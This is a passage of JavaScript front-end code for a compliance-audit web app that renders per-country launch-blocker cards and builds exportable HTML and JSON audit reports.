                  <span class="blockers-count">${c.blockers.length} Blocker(s)</span>
                </div>
                <div class="blockers-list">
                  ${blockerItems}
                </div>
              </div>
            </div>
          `;
        }).join('');

        html += `
          <div class="country-section-container" style="grid-column: 1 / -1;">
            <div class="launch-section-heading blocked">
              <div class="heading-left">
                <span class="badge-icon">⛔</span>
                <h3>Countries Where App Launch is BLOCKED (${blockedFiltered.length} Countries)</h3>
              </div>
              <p>Your app violates local statutory requirements in these countries. To launch here, implement the specific technical fixes indicated on each card.</p>
            </div>
            <div class="jurisdictions-grid" style="margin-top: 14px;">
              ${blockedCards}
            </div>
          </div>
        `;
      }

      // Section B: Allowed Countries
      if (allowedFiltered.length > 0 && statusFilter !== 'blocked') {
        const allowedChips = allowedFiltered.map(c => {
          const badgeClass = c.status === 'restricted' ? 'badge-restricted' : 'badge-ready';
          const badgeText = c.status === 'restricted' ? '⚠️ Advisory Risk' : '✅ Launch Permitted';
          return `
            <div class="allowed-country-card status-${c.status}">
              <div class="allowed-card-top">
                <span class="allowed-flag">${c.flag}</span>
                <span class="allowed-name">${this.escapeHTML(c.name)}</span>
              </div>
              <div class="allowed-card-bottom">
                <span class="allowed-region">${this.escapeHTML(c.region)}</span>
                <span class="jurisdiction-status-badge ${badgeClass}" style="font-size: 0.65rem; padding: 2px 7px;">${badgeText}</span>
              </div>
            </div>
          `;
        }).join('');

        html += `
          <div class="country-section-container" style="grid-column: 1 / -1; margin-top: 24px;">
            <div class="launch-section-heading allowed">
              <div class="heading-left">
                <span class="badge-icon">✅</span>
                <h3>Countries Safe to Launch (${allowedFiltered.length} Countries Permitted)</h3>
              </div>
              <p>No statutory blockers detected. Compliant with local privacy, consumer messaging, and data sovereignty laws.</p>
            </div>
            <div class="allowed-countries-grid" style="margin-top: 14px;">
              ${allowedChips}
            </div>
          </div>
        `;
      }

      this.jurisdictionsContainer.innerHTML = html;
      return;
    }

    // RENDER MODE 2: Regulatory Jurisdictions View
    const filteredJurisdictions = data.jurisdictionResults.filter(r => {
      if (statusFilter === 'blocked' && r.status !== 'blocked') return false;
      if (statusFilter === 'ready' && r.status !== 'ready') return false;
      if (statusFilter === 'restricted' && r.status !== 'restricted') return false;

      if (searchQuery) {
        const countryMatch = r.jurisdiction.countries.some(c => c.toLowerCase().includes(searchQuery));
        const nameMatch = r.jurisdiction.name.toLowerCase().includes(searchQuery);
        const regionMatch = r.jurisdiction.region.toLowerCase().includes(searchQuery);
        const lawMatch = r.jurisdiction.governingLaws.toLowerCase().includes(searchQuery);
        const blockerMatch = r.blockers.some(b => b.title.toLowerCase().includes(searchQuery) || b.desc.toLowerCase().includes(searchQuery));
        if (!countryMatch && !nameMatch && !regionMatch && !lawMatch && !blockerMatch) {
          return false;
        }
      }

      return true;
    });

    if (filteredJurisdictions.length === 0) {
      this.jurisdictionsContainer.innerHTML = `
        <div class="glass-panel" style="padding: 40px; text-align: center; color: var(--text-secondary); grid-column: 1 / -1;">
          <p style="font-size: 1.1rem; margin-bottom: 8px;">No jurisdictions match your search criteria "${this.escapeHTML(searchQuery)}".</p>
        </div>
      `;
      return;
    }

    filteredJurisdictions.forEach(res => {
      const j = res.jurisdiction;
      const card = document.createElement('div');
      card.className = `jurisdiction-card status-${res.status}`;

      let badgeHTML = '';
      if (res.status === 'blocked') {
        badgeHTML = `<span class="jurisdiction-status-badge badge-blocked">⛔ LAUNCH BLOCKED</span>`;
      } else if (res.status === 'restricted') {
        badgeHTML = `<span class="jurisdiction-status-badge badge-restricted">⚠️ REGULATORY RISK</span>`;
      } else {
        badgeHTML = `<span class="jurisdiction-status-badge badge-ready">✅ LAUNCH ALLOWED</span>`;
      }

      const countryChips = j.countries.slice(0, 8).map(c => `<span class="country-pill">${c}</span>`).join('');
      const moreCount = j.countries.length > 8 ? `<span class="country-pill-more">+${j.countries.length - 8} more</span>` : '';

      let blockersHTML = '';
      if (res.blockers.length > 0) {
        const blockerItems = res.blockers.map(b => `
          <div class="blocker-item">
            <div class="blocker-head">
              <span class="blocker-dot"></span>
              <strong>${this.escapeHTML(b.title)}</strong>
              <span class="blocker-law-tag">${this.escapeHTML(b.law)}</span>
            </div>
            <p class="blocker-desc">${this.escapeHTML(b.desc)}</p>
            <div class="blocker-fix-action">
              <span class="fix-label">🛠️ Required Technical Fix:</span>
              <div class="fix-text">${this.escapeHTML(b.fix)}</div>
            </div>
          </div>
        `).join('');

        blockersHTML = `
          <div class="jurisdiction-blockers-section">
            <div class="blockers-header">
              <span>Why is it not allowed in this country / region?</span>
              <span class="blockers-count">${res.blockers.length} Blocker(s)</span>
            </div>
            <div class="blockers-list">
              ${blockerItems}
            </div>
          </div>
        `;
      } else if (res.warnings.length > 0) {
        const warningItems = res.warnings.map(w => `
          <div class="blocker-item warning-type">
            <div class="blocker-head">
              <span class="blocker-dot warning"></span>
              <strong>${this.escapeHTML(w.title)}</strong>
              <span class="blocker-law-tag">${this.escapeHTML(w.law)}</span>
            </div>
            <p class="blocker-desc">${this.escapeHTML(w.desc)}</p>
            <div class="blocker-fix-action">
              <span class="fix-label">💡 Recommended Remediation:</span>
              <div class="fix-text">${this.escapeHTML(w.fix)}</div>
            </div>
          </div>
        `).join('');

        blockersHTML = `
          <div class="jurisdiction-blockers-section">
            <div class="blockers-header" style="color: var(--amber);">
              <span>Regulatory Advisory & Compliance Warnings:</span>
            </div>
            <div class="blockers-list">
              ${warningItems}
            </div>
          </div>
        `;
      } else {
        blockersHTML = `
          <div class="jurisdiction-clean-box">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
            <div>
              <strong>Launch Ready in this Region!</strong>
              <p>Zero statutory blockers detected. Compliant with local privacy, consumer messaging, and data sovereignty laws.</p>
            </div>
          </div>
        `;
      }

      card.innerHTML = `
        <div class="jurisdiction-card-header">
          <div class="jurisdiction-flag-title">
            <span class="jurisdiction-flag">${j.flag}</span>
            <div>
              <h3 class="jurisdiction-name">${j.name}</h3>
              <span class="jurisdiction-region">${j.region} &bull; ${j.countries.length} Country/Territory Target(s)</span>
            </div>
          </div>
          ${badgeHTML}
        </div>

        <div class="jurisdiction-legal-info">
          <div class="legal-row">
            <span class="lbl">Governing Laws:</span>
            <span class="val font-mono">${j.governingLaws}</span>
          </div>
          <div class="legal-row">
            <span class="lbl">Statutory Penalties:</span>
            <span class="val penalty-val">${j.statutoryPenalties}</span>
          </div>
          <div class="legal-row">
            <span class="lbl">Regulatory Authority:</span>
            <span class="val">${j.regulatoryBody}</span>
          </div>
        </div>

        <div class="countries-covered-row">
          <span class="countries-label">Covered Countries:</span>
          <div class="countries-pills-list">
            ${countryChips}
            ${moreCount}
          </div>
        </div>

        ${blockersHTML}
      `;

      this.jurisdictionsContainer.appendChild(card);
    });
  }

  // --- Modal: Export Report ---
  openExportModal() {
    const metrics = this.calculateMetrics();
    const launchData = this.evaluateGlobalLaunchReadiness();
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const appUrl = this.appUrlInput.value.trim() || 'N/A';
    const container = document.getElementById('exportReportContent');

    const fwRows = FRAMEWORKS.map(fw => {
      const data = metrics.fwScores[fw.id] || { score: 0, passed: 0, total: 0 };
      return `
        <tr>
          <td><strong>${fw.name}</strong></td>
          <td>${data.score}%</td>
          <td>${data.passed} / ${data.total}</td>
          <td>${data.gaps}</td>
          <td>${data.score >= 80 ? '✅ Audit Ready' : data.score >= 45 ? '⚠️ Partial' : '❌ At Risk'}</td>
        </tr>
      `;
    }).join('');

    const gapList = CONTROLS.filter(c => this.answers[c.id] === 'gap');
    const gapRows = gapList.length > 0
      ? gapList.map(g => `
          <tr>
            <td><code>${g.id}</code></td>
            <td><strong>${g.title}</strong></td>
            <td><span class="gap-risk-badge ${g.severity}">${g.severity}</span></td>
            <td>${g.remediationTip}</td>
          </tr>
        `).join('')
      : `<tr><td colspan="4" style="text-align: center; color: var(--green);">No critical gaps flagged.</td></tr>`;

    const launchRows = launchData.jurisdictionResults.map(r => {
      const blockerSummary = r.blockers.length > 0 
        ? r.blockers.map(b => `• <strong>${b.title}</strong>: ${b.fix}`).join('<br>')
        : (r.warnings.length > 0 ? r.warnings.map(w => `• <em>${w.title}</em>`).join('<br>') : '<span style="color: var(--green);">Compliant</span>');
      const statusBadge = r.status === 'blocked' 
        ? '<span style="color: var(--rose); font-weight: 700;">⛔ Blocked</span>' 
        : (r.status === 'restricted' ? '<span style="color: var(--amber); font-weight: 700;">⚠️ Risk</span>' : '<span style="color: var(--green); font-weight: 700;">✅ Allowed</span>');
      return `
        <tr>
          <td><strong>${r.jurisdiction.flag} ${r.jurisdiction.name}</strong><br><small style="color: var(--text-muted);">${r.jurisdiction.countries.slice(0, 4).join(', ')}${r.jurisdiction.countries.length > 4 ? '...' : ''}</small></td>
          <td>${statusBadge}</td>
          <td style="font-family: var(--font-mono); font-size: 0.78rem;">${r.jurisdiction.governingLaws}</td>
          <td style="font-size: 0.8rem;">${blockerSummary}</td>
        </tr>
      `;
    }).join('');

    container.innerHTML = `
      <div class="report-section-block">
        <h4>Target Application Metadata</h4>
        <p><strong>Service Name:</strong> ${appName}</p>
        <p><strong>Endpoint / URL:</strong> ${appUrl}</p>
        <p><strong>Assessment Date:</strong> ${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}</p>
        <p><strong>Overall Audit Readiness Score:</strong> <strong style="color: var(--cyan); font-size: 1.15rem;">${metrics.overallScore}%</strong> (${metrics.totalPass} Passed, ${metrics.totalGap} Gaps, ${metrics.pending} Pending)</p>
      </div>

      <div class="report-section-block">
        <h4>Worldwide Launch Readiness Verdict</h4>
        <p><strong>Status:</strong> <strong>${launchData.verdictTitle}</strong></p>
        <p><strong>Country Availability:</strong> <span style="color: var(--green); font-weight: 700;">${launchData.allowedCountriesCount} Countries Safe to Launch</span> &bull; <span style="color: var(--rose); font-weight: 700;">${launchData.blockedCountriesCount} Countries Restricted / Blocked</span> (${launchData.totalBlockersCount} Blockers)</p>
        <table class="report-table">
          <thead>
            <tr>
              <th>Jurisdiction / Target Countries</th>
              <th>Launch Status</th>
              <th>Governing Legislation</th>
              <th>Identified Blockers & Required Fixes</th>
            </tr>
          </thead>
          <tbody>
            ${launchRows}
          </tbody>
        </table>
      </div>

      <div class="report-section-block">
        <h4>Compliance Framework Attestation Breakdown</h4>
        <table class="report-table">
          <thead>
            <tr>
              <th>Framework</th>
              <th>Readiness Score</th>
              <th>Controls Passed</th>
              <th>Flagged Gaps</th>
              <th>Audit Posture</th>
            </tr>
          </thead>
          <tbody>
            ${fwRows}
          </tbody>
        </table>
      </div>

      <div class="report-section-block">
        <h4>High-Priority Actionable Gaps & Remediations</h4>
        <table class="report-table">
          <thead>
            <tr>
              <th>Control ID</th>
              <th>Requirement</th>
              <th>Priority</th>
              <th>Action Plan</th>
            </tr>
          </thead>
          <tbody>
            ${gapRows}
          </tbody>
        </table>
      </div>
    `;

    this.exportModal.classList.add('open');
  }

  downloadJsonReport() {
    const metrics = this.calculateMetrics();
    const launchData = this.evaluateGlobalLaunchReadiness();
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const payload = {
      app: appName,
      url: this.appUrlInput.value.trim(),
      timestamp: new Date().toISOString(),
      overallScore: metrics.overallScore,
      frameworkScores: metrics.fwScores,
      globalLaunchReadiness: {
        verdict: launchData.globalVerdict,
        verdictTitle: launchData.verdictTitle,
        allowedCountriesCount: launchData.allowedCountriesCount,
        blockedCountriesCount: launchData.blockedCountriesCount,
        totalBlockersCount: launchData.totalBlockersCount,
        jurisdictions: launchData.jurisdictionResults.map(r => ({
          id: r.jurisdiction.id,
          name: r.jurisdiction.name,
          region: r.jurisdiction.region,
          countries: r.jurisdiction.countries,
          laws: r.jurisdiction.governingLaws,
          penalties: r.jurisdiction.statutoryPenalties,
          status: r.status,
          blockers: r.blockers,
          warnings: r.warnings
        }))
      },
      codeFindings: this.latestCodeFindings || [],
      answers: this.answers,
      controls: CONTROLS
    };

    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(payload, null, 2));
    const dlAnchor = document.createElement('a');
    dlAnchor.setAttribute("href", dataStr);
    dlAnchor.setAttribute("download", `compliance_audit_${Date.now()}.json`);
    document.body.appendChild(dlAnchor);
    dlAnchor.click();
    dlAnchor.remove();
    this.showToast('JSON audit report downloaded with Global Launch Attestation.');
  }

  showToast(message) {
    const container = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `
      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#00f0ff" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
      <span>${message}</span>
    `;
    container.appendChild(toast);
    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateY(10px)';
      toast.style.transition = 'all 0.3s ease';
      setTimeout(() => toast.remove(), 300);
    }, 3500);
  }
}

// Start application upon DOM load
document.addEventListener('DOMContentLoaded', () => {
  window.app = new ComplianceApp();
});
